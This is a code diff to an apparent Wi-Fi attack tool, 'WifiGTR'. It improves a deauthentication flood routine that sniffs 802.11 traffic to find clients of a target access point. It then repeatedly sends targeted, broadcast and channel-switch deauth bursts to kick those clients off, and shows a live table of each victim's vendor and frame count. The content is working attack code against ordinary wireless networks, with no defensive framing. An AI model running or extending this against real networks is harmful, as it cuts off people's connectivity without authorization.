@@ -720,6 +720,9 @@ class WifiGTR:
                   f"(install mdk4 for a stronger flood).{C_RESET}")
 
         clients = set()
+        client_vendor = {}
+        client_hits = {}
+
         def _sniff_cb(pkt):
             try:
                 if Dot11 is None or not pkt.haslayer(Dot11):
@@ -732,13 +735,16 @@ class WifiGTR:
                     cm = a2
                 elif a2 == b and a1 and a1 != "ff:ff:ff:ff:ff:ff" and not a1.startswith("33:33"):
                     cm = a1
-                if cm:
+                if cm and cm not in clients:
                     clients.add(cm)
+                    client_vendor[cm] = utils.get_vendor(cm) or "Unknown"
             except Exception:
                 pass
 
+        native = ", ".join(n for n, _ in procs) or "scapy-only"
         total_frames = 0
         start = time.time()
+        prev_lines = 0
         try:
             with utils.SignalManager() as sig:
                 while not sig.stopped:
@@ -754,23 +760,45 @@ class WifiGTR:
                     else:
                         time.sleep(1)
 
-                    # Scapy multi-vector: targeted + broadcast + CSA
+                    # Scapy multi-vector: targeted (per-client) + broadcast + CSA
                     if engine:
                         try:
                             for cm in list(clients):
-                                total_frames += engine.send_deauth_burst(client_mac=cm, count=3)
+                                sent = engine.send_deauth_burst(client_mac=cm, count=3)
+                                total_frames += sent
+                                client_hits[cm] = client_hits.get(cm, 0) + sent
                             total_frames += engine.send_deauth_burst(client_mac=None, count=4)
                             total_frames += engine.send_csa_burst(count=2)
                         except Exception as e:
                             logger.debug(f"scapy eviction error: {e}")
 
-                    native = ", ".join(n for n, _ in procs) or "scapy-only"
+                    # ---- live, redrawing status panel with the client table ----
                     elapsed = time.time() - start
-                    sys.stdout.write(
-                        f"\r\033[K{C_CYAN}    [{elapsed:.0f}s] Deauthing {utils.mask_bssid(bssid)} "
-                        f"via {native} | clients: {len(clients)} | scapy frames: {total_frames}{C_RESET}"
+                    lines = []
+                    lines.append(
+                        f"{C_CYAN}    [{elapsed:4.0f}s] Deauthing {utils.mask_bssid(bssid)} "
+                        f"via {native}  |  {C_YELLOW}{len(clients)} client(s){C_CYAN}  |  "
+                        f"{total_frames} frames{C_RESET}"
                     )
+                    if clients:
+                        lines.append(f"{C_GREY}    ── Connected clients being deauthed ──{C_RESET}")
+                        for i, cm in enumerate(sorted(clients), 1):
+                            vend = (client_vendor.get(cm, "Unknown") or "Unknown")[:20]
+                            hits = client_hits.get(cm, 0)
+                            lines.append(
+                                f"      {C_WHITE}{i:>2}){C_RESET} {C_GREEN}{utils.mask_bssid(cm)}{C_RESET}"
+                                f"  {C_GREY}{vend:<20}{C_RESET}  {C_YELLOW}x{hits}{C_RESET}"
+                            )
+                    else:
+                        lines.append(f"{C_GREY}    (scanning for connected clients...){C_RESET}")
+
+                    # Move cursor up over the previous panel, then rewrite it.
+                    if prev_lines:
+                        sys.stdout.write(f"\033[{prev_lines}F")
+                    out = "".join("\033[K" + ln + "\n" for ln in lines)
+                    sys.stdout.write(out)
                     sys.stdout.flush()
+                    prev_lines = len(lines)
         finally:
             for name, p in procs:
                 try:
@@ -785,6 +813,13 @@ class WifiGTR:
 
         print(f"\n{C_YELLOW}[*] Deauth flood stopped. "
               f"Clients seen: {len(clients)} | Scapy frames sent: {total_frames}{C_RESET}")
+        if clients:
+            print(f"{C_CYAN}    Clients that were targeted:{C_RESET}")
+            for i, cm in enumerate(sorted(clients), 1):
+                vend = (client_vendor.get(cm, "Unknown") or "Unknown")[:20]
+                hits = client_hits.get(cm, 0)
+                print(f"      {i:>2}) {C_GREEN}{utils.mask_bssid(cm)}{C_RESET}  "
+                      f"{C_GREY}{vend:<20}{C_RESET}  {C_YELLOW}x{hits} scapy frames{C_RESET}")
         input("Press Enter to return to menu...")
 
     def run_multivector_eviction(self, bssid, channel, ssid):
